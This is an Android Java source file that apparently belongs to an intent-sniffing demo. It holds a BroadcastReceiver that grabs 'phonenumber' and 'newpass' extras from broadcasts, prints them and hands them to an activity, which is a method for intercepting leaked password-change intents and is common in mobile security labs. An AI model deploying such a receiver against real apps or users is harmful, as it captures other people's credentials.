package com.android.dns.sniffintents;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by dns on 10/9/15.
 */
public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub

        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");

        if (phn != null) {
            try {
                Intent bintent = new Intent(context, MainActivity.class);
                bintent.putExtra("phonenumber", phn);
                bintent.putExtra("newpass",newpass);
                context.startActivity(bintent);

                System.out.println("Phonenumber:"+phn);
                System.out.println("newpass:"+newpass);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else {
            System.out.println("Phone number is null");
        }
    }

}